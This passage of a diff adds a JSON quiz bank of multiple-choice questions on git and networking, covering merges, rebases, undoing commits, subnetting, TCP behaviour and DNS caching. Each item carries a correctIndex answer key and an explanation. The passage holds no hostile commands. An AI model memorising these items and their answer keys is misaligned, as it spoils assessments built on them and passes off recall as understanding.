@@ -1,0 +1,1379 @@
+[
+  {
+    "id": "git-basics-staged-snapshot",
+    "topic": "git",
+    "subtopic": "basics",
+    "difficulty": "Easy",
+    "title": "What gets committed after re-editing a staged file",
+    "question": "You edit app.js, run `git add app.js`, then edit app.js again and run `git commit` (no -a). Which version of app.js is committed?",
+    "options": [
+      "The latest version currently in the working tree",
+      "The version that existed when you ran git add",
+      "Both versions, recorded as two separate commits",
+      "Neither, because the file changed after staging"
+    ],
+    "correctIndex": 1,
+    "explanation": "git commit records the index (staging area), and git add copies the file's content into the index at that moment. Later edits stay only in the working tree until you add them again; git commit -a would stage tracked modifications first, which is why the newest version is not used here.",
+    "referenceUrl": "https://git-scm.com/docs/git-add"
+  },
+  {
+    "id": "git-basics-gitignore-tracked",
+    "topic": "git",
+    "subtopic": "basics",
+    "difficulty": "Easy",
+    "title": "Ignored file still shows as modified",
+    "question": "You add `.env` to .gitignore, but `git status` still reports changes to .env. What is going on?",
+    "options": [
+      ".gitignore only takes effect after the .gitignore file itself is committed",
+      "Patterns in .gitignore need a leading slash before they match any file",
+      ".env is already tracked; ignore rules only apply to untracked files, so run git rm --cached .env",
+      "Git caches ignore rules until you run git gc to refresh them"
+    ],
+    "correctIndex": 2,
+    "explanation": "gitignore only prevents untracked files from being added; files already in the index stay tracked no matter what the patterns say. git rm --cached removes the file from the index while keeping it on disk, and after that commit the ignore rule takes effect. Committing .gitignore, leading slashes and gc are irrelevant to this behaviour.",
+    "referenceUrl": "https://git-scm.com/docs/gitignore"
+  },
+  {
+    "id": "git-basics-detached-head-commits",
+    "topic": "git",
+    "subtopic": "basics",
+    "difficulty": "Medium",
+    "title": "Commits made in detached HEAD",
+    "question": "You run `git checkout v1.2.0`, make two commits, then `git switch main`. What happens to those two commits?",
+    "options": [
+      "They belong to no branch and become unreachable, recoverable via the reflog until garbage-collected",
+      "They are automatically appended to main when you switch back to it",
+      "The v1.2.0 tag is moved forward to point at the newest of the two commits",
+      "They never existed, because Git refuses to commit in detached HEAD state"
+    ],
+    "correctIndex": 0,
+    "explanation": "Checking out a tag detaches HEAD: new commits are created but no branch ref points at them. When you switch away, nothing references them except the HEAD reflog, so they will eventually be pruned unless you create a branch (git switch -c fix <sha>). Tags never move on their own, and Git does allow commits while detached.",
+    "referenceUrl": "https://git-scm.com/docs/git-switch"
+  },
+  {
+    "id": "git-merge-fast-forward",
+    "topic": "git",
+    "subtopic": "branching-merging",
+    "difficulty": "Easy",
+    "title": "Merging when main has not moved",
+    "question": "You branched `feature` from main and main has had no new commits since. What does `git merge feature` on main do by default?",
+    "options": [
+      "Creates a merge commit with two parents to record the integration",
+      "Squashes all of feature's commits into one new commit on main",
+      "Rebases feature's commits onto main, giving them new hashes",
+      "Fast-forwards main's pointer to feature's tip without creating a merge commit"
+    ],
+    "correctIndex": 3,
+    "explanation": "When the current branch is an ancestor of the branch being merged, Git can simply move the ref forward: there is nothing to combine. A merge commit is only created when histories diverged or when --no-ff is given; squashing and rebasing require explicit commands.",
+    "referenceUrl": "https://git-scm.com/docs/git-merge"
+  },
+  {
+    "id": "git-merge-no-ff",
+    "topic": "git",
+    "subtopic": "branching-merging",
+    "difficulty": "Medium",
+    "title": "Keep feature merges visible in history",
+    "question": "Your team wants every merged feature to appear as a distinct unit in history, even when a fast-forward would be possible. Which merge command enforces this?",
+    "options": [
+      "git merge --no-ff feature",
+      "git merge --ff-only feature",
+      "git merge --squash feature",
+      "git merge -s ours feature"
+    ],
+    "correctIndex": 0,
+    "explanation": "--no-ff always creates a merge commit, so the feature's commits stay grouped under it and the whole feature can be reverted with one revert -m. --ff-only does the opposite (refuses anything but a fast-forward), --squash discards the branch topology entirely, and -s ours throws away the feature's changes.",
+    "referenceUrl": "https://git-scm.com/docs/git-merge"
+  },
+  {
+    "id": "git-merge-ours-strategy-vs-option",
+    "topic": "git",
+    "subtopic": "branching-merging",
+    "difficulty": "Hard",
+    "title": "-s ours versus -X ours",
+    "question": "What is the difference between `git merge -s ours topic` and `git merge -X ours topic`?",
+    "options": [
+      "-s ours resolves only conflicting hunks with our side; -X ours discards all of topic's changes",
+      "They are equivalent; -X is simply the short spelling of the -s ours strategy",
+      "-s ours discards all of topic's changes; -X ours merges normally but resolves only conflicting hunks with our side",
+      "-s ours keeps topic's side for conflicts; -X ours keeps the current branch's side"
+    ],
+    "correctIndex": 2,
+    "explanation": "The ours merge strategy records a merge but keeps the current tree untouched, ignoring everything from the other branch. The ours strategy option (-X ours) is passed to the default ort strategy: non-conflicting changes from topic are still merged, and only conflicting hunks favour the current branch. Confusing the two silently drops work.",
+    "referenceUrl": "https://git-scm.com/docs/git-merge"
+  },
+  {
+    "id": "git-merge-rerere",
+    "topic": "git",
+    "subtopic": "branching-merging",
+    "difficulty": "Hard",
+    "title": "Reusing recorded conflict resolutions",
+    "question": "A long-lived branch is repeatedly merged and rebased against main, and you keep resolving the same conflicts by hand. Which Git feature records your resolutions and reapplies them automatically?",
+    "options": [
+      "git mergetool with the --auto flag",
+      "rerere, enabled with rerere.enabled=true",
+      "git rebase --autosquash",
+      "merge.conflictStyle set to diff3"
+    ],
+    "correctIndex": 1,
+    "explanation": "rerere (reuse recorded resolution) stores the pre- and post-image of each resolved conflict and replays the resolution when the same conflict appears again, during merges or rebases. --autosquash only reorders fixup! commits, conflictStyle only changes how markers look, and mergetool just launches an external tool.",
+    "referenceUrl": "https://git-scm.com/docs/git-rerere"
+  },
+  {
+    "id": "git-rebase-shared-branch",
+    "topic": "git",
+    "subtopic": "rebase",
+    "difficulty": "Medium",
+    "title": "Rebasing a branch others have pulled",
+    "question": "You rebased `feature`, which two teammates had already pulled, and force-pushed it. What problem do the teammates face?",
+    "options": [
+      "Their working trees are reset automatically and any uncommitted changes are lost",
+      "The remote rejects their next fetch until they delete and re-clone the repository",
+      "Nothing; Git matches rewritten commits by patch-id during fetch and syncs silently",
+      "Their local feature still holds the old commits, so a plain pull merges old and rewritten copies and duplicates work"
+    ],
+    "correctIndex": 3,
+    "explanation": "Rebasing creates new commits with new hashes. Teammates' branches are still based on the originals, so a default pull merges both histories and the same changes appear twice (often with conflicts). They must recover with git pull --rebase or git rebase --onto, as the RECOVERING FROM UPSTREAM REBASE section of git-rebase explains; fetches are never rejected and working trees are not touched.",
+    "referenceUrl": "https://git-scm.com/docs/git-rebase"
+  },
+  {
+    "id": "git-rebase-force-with-lease",
+    "topic": "git",
+    "subtopic": "rebase",
+    "difficulty": "Hard",
+    "title": "Why --force-with-lease after a rebase",
+    "question": "After rebasing your PR branch you must force-push. Why is `git push --force-with-lease` preferred over `--force`, and what can still defeat it?",
+    "options": [
+      "It keeps the old remote commits as a backup ref; deleting that ref manually defeats it",
+      "It only forces when CI has passed on the new commits; skipping CI defeats it",
+      "It rebases the remote branch server-side; a protected branch rule defeats it",
+      "It refuses if the remote ref moved since you last fetched it; a background fetch that updates origin/* can silently defeat it"
+    ],
+    "correctIndex": 3,
+    "explanation": "--force-with-lease compares the remote ref with your remote-tracking ref and refuses if someone else pushed in the meantime. If an IDE or cron job fetches in the background, your tracking ref already includes their commit, so the lease passes and you overwrite it anyway; --force-if-includes (or an explicit expected sha) closes that gap. It has nothing to do with backups, CI or server-side rebases.",
+    "referenceUrl": "https://git-scm.com/docs/git-push"
+  },
+  {
+    "id": "git-rebase-onto",
+    "topic": "git",
+    "subtopic": "rebase",
+    "difficulty": "Hard",
+    "title": "Transplanting a branch with --onto",
+    "question": "`feature` was branched from `old-base` (itself unmerged), not from main. You want only feature's own commits replayed onto main. Which command does that?",
+    "options": [
+      "git rebase main feature",
+      "git rebase --onto main old-base feature",
+      "git rebase --onto old-base main feature",
+      "git rebase -i main old-base"
+    ],
+    "correctIndex": 1,
+    "explanation": "git rebase --onto <newbase> <upstream> <branch> takes the commits in upstream..branch (feature's own commits) and replays them on newbase. A plain git rebase main feature would also replay old-base's commits that are not in main, and the swapped arguments would move the wrong range onto the wrong base.",
+    "referenceUrl": "https://git-scm.com/docs/git-rebase"
+  },
+  {
+    "id": "git-rebase-range-diff",
+    "topic": "git",
+    "subtopic": "rebase",
+    "difficulty": "Expert",
+    "title": "Reviewing what changed between two rebased versions",
+    "question": "You rebased a 6-commit PR onto a main that moved by 40 commits and tweaked two commits while resolving conflicts. A reviewer wants to see only how your series changed, not upstream's changes. What should they use?",
+    "options": [
+      "git range-diff comparing the old base..old tip range with the new base..new tip range",
+      "git diff between the old tip and the new tip of the PR branch",
+      "git log --cherry-mark on the symmetric difference of the two tips",
+      "git diff --merge-base from the old tip to the new tip"
+    ],
+    "correctIndex": 0,
+    "explanation": "range-diff pairs up commits from two versions of a series and shows the diff of each pair's patches, so upstream changes that came along with the new base are excluded. A plain diff between the tips includes all 40 upstream commits, and cherry-mark only flags which commits are patch-equivalent without showing how they differ.",
+    "referenceUrl": "https://git-scm.com/docs/git-range-diff"
+  },
+  {
+    "id": "git-remotes-fetch-effect",
+    "topic": "git",
+    "subtopic": "remotes",
+    "difficulty": "Easy",
+    "title": "What git fetch changes",
+    "question": "What does `git fetch origin` do to the local branch you currently have checked out?",
+    "options": [
+      "It merges origin/main into the current branch",
+      "It rebases the current branch onto origin/main",
+      "Nothing; it only updates remote-tracking refs such as origin/main",
+      "It resets the current branch to match the remote"
+    ],
+    "correctIndex": 2,
+    "explanation": "fetch downloads objects and updates refs under refs/remotes/origin/, leaving your local branches, index and working tree alone. git pull is fetch followed by a merge (or rebase, depending on configuration); resetting would need an explicit git reset.",
+    "referenceUrl": "https://git-scm.com/docs/git-fetch"
+  },
+  {
+    "id": "git-remotes-pull-rebase",
+    "topic": "git",
+    "subtopic": "remotes",
+    "difficulty": "Medium",
+    "title": "Make pull rebase instead of merge",
+    "question": "Your local main has 2 unpushed commits and origin/main has 3 new ones. Which configuration makes `git pull` replay your commits on top of origin/main instead of creating a merge commit?",
+    "options": [
+      "pull.ff=only",
+      "merge.ff=false",
+      "pull.rebase=true",
+      "fetch.prune=true"
+    ],
+    "correctIndex": 2,
+    "explanation": "pull.rebase=true makes pull run git rebase after fetching, yielding linear history. pull.ff=only would refuse here because the branches have diverged, merge.ff=false forces merge commits, and fetch.prune only deletes stale remote-tracking refs.",
+    "referenceUrl": "https://git-scm.com/docs/git-pull"
+  },
+  {
+    "id": "git-undo-reset-soft",
+    "topic": "git",
+    "subtopic": "undoing",
+    "difficulty": "Easy",
+    "title": "Effect of reset --soft HEAD~1",
+    "question": "What does `git reset --soft HEAD~1` do?",
+    "options": [
+      "Moves the branch back one commit and leaves the changes unstaged in the working tree",
+      "Moves the branch back one commit and discards that commit's changes entirely",
+      "Creates a new commit that undoes the changes of the last commit",
+      "Moves the branch back one commit and leaves that commit's changes staged"
+    ],
+    "correctIndex": 3,
+    "explanation": "--soft only moves the branch ref, so the index and working tree still contain the undone commit's changes, ready to be recommitted. --mixed (the default) also resets the index, leaving changes unstaged, --hard resets everything, and creating an inverse commit is what git revert does.",
+    "referenceUrl": "https://git-scm.com/docs/git-reset"
+  },
+  {
+    "id": "git-undo-revert-pushed",
+    "topic": "git",
+    "subtopic": "undoing",
+    "difficulty": "Medium",
+    "title": "Undoing a commit already on shared main",
+    "question": "A buggy commit was pushed to the shared main branch an hour ago and several teammates have pulled it. What is the safest way to undo it?",
+    "options": [
+      "Reset main to the commit before it and force-push",
+      "Run git revert on that commit and push the new commit",
+      "Amend the commit to remove the bug and force-push",
+      "Drop it with an interactive rebase and force-push"
+    ],
+    "correctIndex": 1,
+    "explanation": "git revert adds a new commit that inverts the bad one, so history only moves forward and nobody's clone is invalidated. Reset, amend and interactive rebase all rewrite published history, forcing every teammate to repair their local branches and risking lost work.",
+    "referenceUrl": "https://git-scm.com/docs/git-revert"
+  },
+  {
+    "id": "git-undo-reflog-recover",
+    "topic": "git",
+    "subtopic": "undoing",
+    "difficulty": "Medium",
+    "title": "Recovering after reset --hard",
+    "question": "You ran `git reset --hard HEAD~3` on a local branch and realise you needed those three commits. How do you get them back?",
+    "options": [
+      "Find the previous tip in git reflog and reset or branch to it, e.g. git reset --hard HEAD@{1}",
+      "Run git revert HEAD~3 to restore the three dropped commits",
+      "They are gone; reset --hard deletes the commit objects immediately",
+      "Pull from origin, since reset --hard never affects committed history"
+    ],
+    "correctIndex": 0,
+    "explanation": "reset --hard only moves the branch pointer; the commits stay in the object database and the reflog records where HEAD and the branch pointed before. Revert would create inverse commits of older history, and pulling only helps if the commits had been pushed. Objects are only pruned after reflog expiry and gc.",
+    "referenceUrl": "https://git-scm.com/docs/git-reflog"
+  },
+  {
+    "id": "git-undo-pushed-secret",
+    "topic": "git",
+    "subtopic": "undoing",
+    "difficulty": "Expert",
+    "title": "You pushed a live secret",
+    "question": "You pushed a commit containing a live cloud access key to a public GitHub repository an hour ago. What is the correct first action?",
+    "options": [
+      "Revoke and rotate the key, then purge it from history and coordinate the rewrite",
+      "Revert the commit so the key no longer appears at the tip of the branch",
+      "Rewrite history with git filter-repo and force-push, then rotate the key if logs show misuse",
+      "Make the repository private, which removes the key from forks and caches"
+    ],
+    "correctIndex": 0,
+    "explanation": "Once pushed publicly, assume the secret is compromised: automated scrapers find keys within minutes, and clones, forks and cached views may already hold it. Rotation is the only action that actually neutralises it. A revert leaves the key in history, rewriting history cannot reach existing copies, and making the repo private does not remove forks or clones.",
+    "referenceUrl": "https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository"
+  },
+  {
+    "id": "git-undo-remerge-after-revert",
+    "topic": "git",
+    "subtopic": "undoing",
+    "difficulty": "Expert",
+    "title": "Re-merging a branch after reverting its merge",
+    "question": "You reverted the merge of `feature` into main with `git revert -m 1 M`. After fixing feature with two new commits you merge it again, but most of the original changes are missing on main. Why, and what fixes it?",
+    "options": [
+      "The -m 1 flag permanently excludes that branch from merges; recreate feature under a new name",
+      "The second merge used the ort strategy, which skips reverted hunks; merge with -s recursive",
+      "The reverted commits were garbage-collected; cherry-pick them back from the remote",
+      "Git sees feature's old commits as already merged, so only the new ones apply; revert the revert commit, then merge"
+    ],
+    "correctIndex": 3,
+    "explanation": "Reverting a merge undoes its changes but does not undo history: the old feature commits are still ancestors of main, so the next merge only brings in commits after the old merge base. Reverting the revert restores those changes before merging the fixes, as described in the revert documentation. There is no blacklist, ort does not track reverts, and the commits are still reachable.",
+    "referenceUrl": "https://git-scm.com/docs/git-revert"
+  },
+  {
+    "id": "git-adv-cherry-pick-hotfix",
+    "topic": "git",
+    "subtopic": "advanced",
+    "difficulty": "Medium",
+    "title": "Backporting one fix to a release branch",
+    "question": "Fix commit abc123 landed on main. You need exactly that fix on release/2.3 without any other commits from main, and want traceability. What do you run on release/2.3?",
+    "options": [
+      "git merge main",
+      "git rebase main",
+      "git cherry-pick -x abc123",
+      "git revert abc123"
+    ],
+    "correctIndex": 2,
+    "explanation": "cherry-pick applies the change introduced by a single commit as a new commit, and -x appends '(cherry picked from commit abc123)' to the message for traceability. Merging or rebasing on main would drag in every other commit, and revert would apply the inverse of the fix.",
+    "referenceUrl": "https://git-scm.com/docs/git-cherry-pick"
+  },
+  {
+    "id": "git-adv-stash-untracked",
+    "topic": "git",
+    "subtopic": "advanced",
+    "difficulty": "Medium",
+    "title": "What git stash leaves behind",
+    "question": "You have modified tracked files plus a new untracked file config.local, and run `git stash`. What is the state afterwards?",
+    "options": [
+      "Both the tracked changes and config.local are stashed together",
+      "Tracked changes are stashed but config.local stays in the working tree; -u would include it",
+      "Tracked changes are stashed and config.local is deleted from disk",
+      "git stash refuses to run while untracked files are present"
+    ],
+    "correctIndex": 1,
+    "explanation": "By default git stash saves changes to tracked files (index and working tree) only. Untracked files are left untouched unless you pass --include-untracked (-u), or --all to also include ignored files. Nothing is deleted and untracked files do not block stashing.",
+    "referenceUrl": "https://git-scm.com/docs/git-stash"
+  },
+  {
+    "id": "git-adv-annotated-tag",
+    "topic": "git",
+    "subtopic": "advanced",
+    "difficulty": "Easy",
+    "title": "Annotated versus lightweight tags",
+    "question": "What distinguishes an annotated tag from a lightweight tag?",
+    "options": [
+      "An annotated tag automatically moves forward as new commits land on the branch",
+      "An annotated tag is its own object with tagger, date, message and optional signature",
+      "Only annotated tags can be pushed to a remote; lightweight tags stay local",
+      "An annotated tag can only point at merge commits, not at regular commits"
+    ],
+    "correctIndex": 1,
+    "explanation": "git tag -a creates a tag object that stores who tagged, when, a message and optionally a GPG/SSH signature; a lightweight tag is just a ref pointing at a commit. Neither kind moves, both can be pushed, and both can point at any commit. Release tags should generally be annotated.",
+    "referenceUrl": "https://git-scm.com/docs/git-tag"
+  },
+  {
+    "id": "git-adv-bisect-run",
+    "topic": "git",
+    "subtopic": "advanced",
+    "difficulty": "Hard",
+    "title": "Finding a regression among 1,000 commits",
+    "question": "A regression appeared somewhere in the last 1,000 commits. You have a script test.sh that exits 0 when the behaviour is good and 1 when bad. What is the most efficient approach?",
+    "options": [
+      "git log -S on the failing function name and inspect each matching commit",
+      "git blame on the failing file and test each commit it lists",
+      "git bisect start <bad> <good>, then git bisect run ./test.sh, about 10 test runs",
+      "Cherry-pick each commit onto the last good version and run the test"
+    ],
+    "correctIndex": 2,
+    "explanation": "bisect performs a binary search over history, so 1,000 commits need about log2(1000), roughly 10 tests, and bisect run automates it using the script's exit code (125 marks a commit untestable). Pickaxe and blame only find commits that touched certain text, which may not be the cause, and cherry-picking each commit is linear and error-prone.",
+    "referenceUrl": "https://git-scm.com/docs/git-bisect"
+  },
+  {
+    "id": "git-wf-squash-merge-reuse-branch",
+    "topic": "git",
+    "subtopic": "workflows",
+    "difficulty": "Medium",
+    "title": "Reusing a branch after squash merge",
+    "question": "Your PR was merged with GitHub's 'Squash and merge'. You keep working on the same branch and open a new PR, which now shows your old commits and conflicts. Why?",
+    "options": [
+      "Squash merge deletes the branch's history on the server, leaving orphaned commits",
+      "GitHub requires a force-push to the branch after every squash merge",
+      "Squash merge rewrites earlier commits on main, so your branch's base changed",
+      "The squash commit is a new commit unrelated to your originals, so Git does not see them as merged"
+    ],
+    "correctIndex": 3,
+    "explanation": "Squashing creates one new commit on main with the combined changes but no parent link to your branch's commits, so from Git's view your original commits are still unmerged. The fix is to start new work from an updated main (or rebase --onto). Squash merging does not delete history or rewrite main.",
+    "referenceUrl": "https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/incorporating-changes-from-a-pull-request/about-pull-request-merges"
+  },
+  {
+    "id": "git-wf-branch-protection",
+    "topic": "git",
+    "subtopic": "workflows",
+    "difficulty": "Easy",
+    "title": "Requiring checks and reviews before merge",
+    "question": "Which GitHub feature lets you require passing status checks and at least one approving review before anything is merged into main?",
+    "options": [
+      "Branch protection rules (or rulesets) on main",
+      "A CODEOWNERS file at the repository root",
+      "Merge settings defined in .gitattributes",
+      "A pre-commit hook committed to the repository"
+    ],
+    "correctIndex": 0,
+    "explanation": "Protected branches enforce merge requirements on the server: required status checks, required reviews, linear history and more. CODEOWNERS only designates reviewers (and is enforced only when protection requires code owner review), .gitattributes controls merge drivers, and client-side hooks can be skipped.",
+    "referenceUrl": "https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-protected-branches/about-protected-branches"
+  },
+  {
+    "id": "git-wf-merge-queue",
+    "topic": "git",
+    "subtopic": "workflows",
+    "difficulty": "Hard",
+    "title": "Two green PRs that break main together",
+    "question": "Two PRs each pass CI against main, but once both are merged the build breaks because of how they interact. Which GitHub feature is designed to prevent this?",
+    "options": [
+      "Requiring linear history on the main branch",
+      "Requiring signed commits on the main branch",
+      "A merge queue that tests each PR combined with main and the PRs queued ahead of it",
+      "Dismissing stale approvals when new commits are pushed"
+    ],
+    "correctIndex": 2,
+    "explanation": "Each PR was tested against a main that did not include the other PR. A merge queue builds temporary branches containing the latest main plus queued PRs and only merges when that combination passes. Linear history, signed commits and dismissing approvals do not test the combined result.",
+    "referenceUrl": "https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/configuring-pull-request-merges/managing-a-merge-queue"
+  },
+  {
+    "id": "nw-models-transport-layer",
+    "topic": "networking",
+    "subtopic": "models",
+    "difficulty": "Easy",
+    "title": "Layer that uses port numbers",
+    "question": "In the TCP/IP model, which layer provides end-to-end communication between processes and identifies them with port numbers?",
+    "options": [
+      "Internet layer",
+      "Link layer",
+      "Application layer",
+      "Transport layer"
+    ],
+    "correctIndex": 3,
+    "explanation": "TCP and UDP live in the transport layer and use source and destination ports to multiplex many conversations between the same two hosts. The internet layer (IP) moves packets between hosts by address, the link layer handles the local medium, and applications sit on top of transport.",
+    "referenceUrl": "https://www.rfc-editor.org/rfc/rfc1122"
+  },
+  {
+    "id": "nw-models-ping-ok-curl-fails",
+    "topic": "networking",
+    "subtopic": "models",
+    "difficulty": "Medium",
+    "title": "Ping works but HTTPS times out",
+    "question": "`ping api.internal` succeeds, but `curl https://api.internal` hangs until it times out. Which conclusion is best supported?",
+    "options": [
+      "IP reachability is fine; the problem is at the transport or application level, e.g. TCP 443 filtered or nothing listening",
+      "Name resolution is broken, because curl resolves names differently from ping",
+      "The physical link is flapping, which ping cannot detect but TCP can",
+      "The server's TLS certificate has expired, which makes the connection hang"
+    ],
+    "correctIndex": 0,
+    "explanation": "A successful ping shows the name resolved and ICMP packets travel both ways at the network layer. A hang (rather than a refusal or TLS error) typically means TCP SYNs to port 443 are silently dropped by a firewall or security group. An expired certificate produces an immediate handshake error, not a timeout.",
+    "referenceUrl": "https://www.rfc-editor.org/rfc/rfc1122"
+  },
+  {
+    "id": "nw-ip-usable-hosts-26",
+    "topic": "networking",
+    "subtopic": "ip-subnetting",
+    "difficulty": "Easy",
+    "title": "Usable hosts in a /26",
+    "question": "How many usable host addresses does a traditional IPv4 /26 subnet provide?",
+    "options": [
+      "64",
+      "62",
+      "30",
+      "126"
+    ],
+    "correctIndex": 1,
+    "explanation": "A /26 leaves 32 - 26 = 6 host bits, giving 2^6 = 64 addresses. The network address and the broadcast address are not assignable to hosts, leaving 62. 30 is a /27 and 126 is a /25.",
+    "referenceUrl": "https://www.rfc-editor.org/rfc/rfc4632"
+  },
+  {
+    "id": "nw-ip-same-subnet-check",
+    "topic": "networking",
+    "subtopic": "ip-subnetting",
+    "difficulty": "Medium",
+    "title": "Is the destination on-link?",
+    "question": "Host A is 10.0.1.100/25 and wants to send a packet to 10.0.1.200. What does A do?",
+    "options": [
+      "ARPs directly for 10.0.1.200, because both addresses share 10.0.1.0/24",
+      "Sends it to its default gateway, because .200 is in 10.0.1.128/25, a different subnet",
+      "Drops it, because a /25 network cannot route to other subnets",
+      "Broadcasts it to 10.0.1.255 so that the destination host picks it up"
+    ],
+    "correctIndex": 1,
+    "explanation": "A /25 splits 10.0.1.0/24 into 10.0.1.0-127 and 10.0.1.128-255. A applies its own mask, sees the destination is off-link, and forwards to the gateway. Assuming a /24 is the classic mistake; hosts never broadcast unicast traffic to reach peers.",
+    "referenceUrl": "https://www.rfc-editor.org/rfc/rfc4632"
+  },
+  {
+    "id": "nw-ip-overlapping-vpc-cidrs",
+    "topic": "networking",
+    "subtopic": "ip-subnetting",
+    "difficulty": "Hard",
+    "title": "Peering with an overlapping CIDR",
+    "question": "Your VPC uses 10.0.0.0/16 and a partner asks to peer their VPC, which uses 10.0.128.0/17. What is the problem?",
+    "options": [
+      "A /17 is a larger network than a /16, so the partner must shrink their range first",
+      "RFC 1918 ranges cannot be routed between networks owned by different organisations",
+      "The ranges overlap, so routes are ambiguous; you need non-overlapping CIDRs or NAT between them",
+      "Nothing; longest-prefix matching routes traffic correctly in both directions"
+    ],
+    "correctIndex": 2,
+    "explanation": "10.0.128.0/17 is the upper half of 10.0.0.0/16. Peering requires non-overlapping ranges, and even where a router accepts it, longest-prefix match would send traffic for your own 10.0.128.x hosts to the partner. A /17 is smaller than a /16, and private ranges can be routed privately between organisations.",
+    "referenceUrl": "https://www.rfc-editor.org/rfc/rfc1918"
+  },
+  {
+    "id": "nw-tcp-three-way-handshake",
+    "topic": "networking",
+    "subtopic": "tcp-udp",
+    "difficulty": "Easy",
+    "title": "TCP connection establishment",
+    "question": "What is the correct sequence of the TCP three-way handshake?",
+    "options": [
+      "SYN, ACK, SYN-ACK",
+      "SYN, ACK, FIN",
+      "ACK, SYN, SYN-ACK",
+      "SYN, SYN-ACK, ACK"
+    ],
+    "correctIndex": 3,
+    "explanation": "The client sends SYN with its initial sequence number, the server answers with SYN-ACK carrying its own sequence number and acknowledging the client's, and the client ACKs the server's. Both sides then have synchronised sequence numbers; FIN is used for closing.",
+    "referenceUrl": "https://www.rfc-editor.org/rfc/rfc9293"
+  },
+  {
+    "id": "nw-tcp-time-wait-exhaustion",
+    "topic": "networking",
+    "subtopic": "tcp-udp",
+    "difficulty": "Hard",
+    "title": "TIME_WAIT pile-up on outbound calls",
+    "question": "A service opens a new HTTP connection per request to one backend. Under load it shows tens of thousands of sockets in TIME_WAIT and errors like 'cannot assign requested address'. What is the most effective fix?",
+    "options": [
+      "Reuse connections with keep-alive and a connection pool",
+      "Lower the backend's listen backlog to shed load",
+      "Disable Nagle's algorithm on the client with TCP_NODELAY",
+      "Increase the server's TCP receive window size"
+    ],
+    "correctIndex": 0,
+    "explanation": "The side that closes first holds the connection in TIME_WAIT for twice the maximum segment lifetime, and each one pins a source port for that destination. Opening and closing a connection per request exhausts the ephemeral port range. Pooling removes the churn; backlog, Nagle and window size do not affect port consumption.",
+    "referenceUrl": "https://www.rfc-editor.org/rfc/rfc9293"
+  },
+  {
+    "id": "nw-udp-real-time-voice",
+    "topic": "networking",
+    "subtopic": "tcp-udp",
+    "difficulty": "Easy",
+    "title": "Why voice calls use UDP",
+    "question": "Why do real-time voice and video applications usually carry media over UDP instead of TCP?",
+    "options": [
+      "UDP guarantees delivery with less header overhead than TCP does",
+      "TCP connections cannot traverse home NAT routers reliably",
+      "TCP's in-order reliable delivery stalls on retransmits, and late audio is useless anyway",
+      "UDP payloads are encrypted by default while TCP payloads are not"
+    ],
+    "correctIndex": 2,
+    "explanation": "TCP must deliver bytes in order, so one lost packet blocks everything behind it until it is retransmitted, adding jitter. For live media it is better to skip a lost packet and conceal the gap. UDP makes no delivery guarantee, provides no encryption, and TCP works fine through NAT.",
+    "referenceUrl": "https://www.rfc-editor.org/rfc/rfc768"
+  },
+  {
+    "id": "nw-tcp-pmtud-black-hole",
+    "topic": "networking",
+    "subtopic": "tcp-udp",
+    "difficulty": "Expert",
+    "title": "Large responses hang over a VPN",
+    "question": "Over a new VPN tunnel, SSH works and small pages load, but large HTTPS downloads hang forever. A firewall in the path drops all ICMP. What is the likely cause?",
+    "options": [
+      "A path MTU discovery black hole: 'fragmentation needed' ICMP is dropped, so oversized DF packets vanish",
+      "TCP window scaling is disabled, so transfers above 64 KB are refused",
+      "TLS session tickets expire in the middle of long downloads",
+      "Nagle's algorithm holds back the final segments of large responses"
+    ],
+    "correctIndex": 0,
+    "explanation": "Tunnels add headers and lower the effective MTU. TCP sets Don't Fragment and relies on ICMP 'fragmentation needed' messages to learn the smaller path MTU; if a firewall drops them, full-size segments disappear while small packets pass. Fixes are allowing that ICMP type or clamping the TCP MSS on the tunnel. Window scaling limits throughput, it does not cause hangs.",
+    "referenceUrl": "https://www.rfc-editor.org/rfc/rfc1191"
+  },
+  {
+    "id": "nw-dns-cname-apex",
+    "topic": "networking",
+    "subtopic": "dns",
+    "difficulty": "Medium",
+    "title": "CNAME at the zone apex",
+    "question": "Your DNS provider will not let you create a CNAME for example.com itself pointing at a load balancer hostname. Why?",
+    "options": [
+      "CNAME records only work for names with at least three labels",
+      "DNSSEC requires the apex to be an A record so it can be signed",
+      "Registrars forbid CNAMEs at the apex to prevent domain hijacking",
+      "A CNAME cannot coexist with other records, and the apex must hold SOA and NS records"
+    ],
+    "correctIndex": 3,
+    "explanation": "A CNAME declares that a name is an alias, so no other data may exist at that name. The zone apex always has SOA and NS records, so an apex CNAME would break the zone. Providers work around this with ALIAS/ANAME flattening or the newer HTTPS/SVCB records; label count, DNSSEC and registrars are not the reason.",
+    "referenceUrl": "https://www.rfc-editor.org/rfc/rfc1034"
+  },
+  {
+    "id": "nw-dns-ttl-migration",
+    "topic": "networking",
+    "subtopic": "dns",
+    "difficulty": "Hard",
+    "title": "Planning an IP cutover with DNS",
+    "question": "You are moving an API to a new IP address. Its A record has a TTL of 86400 seconds. What is the right plan?",
+    "options": [
+      "Switch the record and flush your own resolver; all clients update within minutes",
+      "Lower the TTL at least a day ahead, switch the record, keep the old IP serving until caches expire",
+      "Set the TTL to 0 at the moment of cutover so every cache refetches immediately",
+      "Change the NS records instead, because delegation changes bypass resolver caches"
+    ],
+    "correctIndex": 1,
+    "explanation": "Resolvers may cache the old answer for the full TTL they received, so the lower TTL only helps after the old 24-hour TTL has expired everywhere. Changing the TTL at cutover affects nobody who already cached the record, flushing your own resolver does nothing for others, and NS records are cached too, often with long TTLs.",
+    "referenceUrl": "https://www.rfc-editor.org/rfc/rfc1035"
+  },
+  {
+    "id": "nw-dns-negative-caching",
+    "topic": "networking",
+    "subtopic": "dns",
+    "difficulty": "Medium",
+    "title": "New hostname still returns NXDOMAIN",
+    "question": "A script queried new.example.com just before you created the record. Now the record exists, but that resolver keeps returning NXDOMAIN for a while. Why?",
+    "options": [
+      "NXDOMAIN answers stay cached until the resolver process is restarted",
+      "New records always need up to 48 hours to propagate through the registrar",
+      "The new A record's TTL has to count down once before it becomes visible",
+      "Resolvers cache negative answers for a time derived from the zone's SOA record"
+    ],
+    "correctIndex": 3,
+    "explanation": "Negative caching lets resolvers remember non-existence, for the minimum of the SOA record's TTL and its MINIMUM field. Until that expires the resolver will not ask again. Registrars are not involved in records inside your zone, and a record's TTL only governs how long the positive answer is cached.",
+    "referenceUrl": "https://www.rfc-editor.org/rfc/rfc2308"
+  },
+  {
